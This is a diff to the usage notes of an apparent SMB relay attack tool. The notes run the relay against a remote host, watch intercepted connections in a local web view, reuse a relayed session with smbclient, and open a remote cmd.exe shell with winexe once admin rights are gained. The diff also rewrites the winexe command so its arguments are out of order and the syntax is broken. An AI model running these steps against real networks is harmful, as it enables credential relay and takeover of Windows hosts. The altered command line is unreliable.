@@ -13,6 +13,8 @@ Automatically performs the SMB relay attack either locally or on a remote device
 
 * python autoresp.py -x remote-network.xml -i eth0 -r 95.34.53.243 
 
+---
+
 
 Point your local browser to http://localhost:4001 and refresh it periodically to see your MITM'd connections
 
@@ -23,5 +25,5 @@ After a connection is expired (or you expire it), click "choose"
 Run this command locally if relaying locally or run it on the jumpbox if you're relaying remotely: smbclient -U a%a //127.0.0.1
 
 
-Alternatively, if you gain admin rights through the SMB connection spawn a shell with: winexe //127.0.0.1 -U "a%a" cmd.exe
+Alternatively, if you gain admin rights through the SMB connection spawn a shell with: winexe a%a //127.0.0.1 -U cmd.exe
 
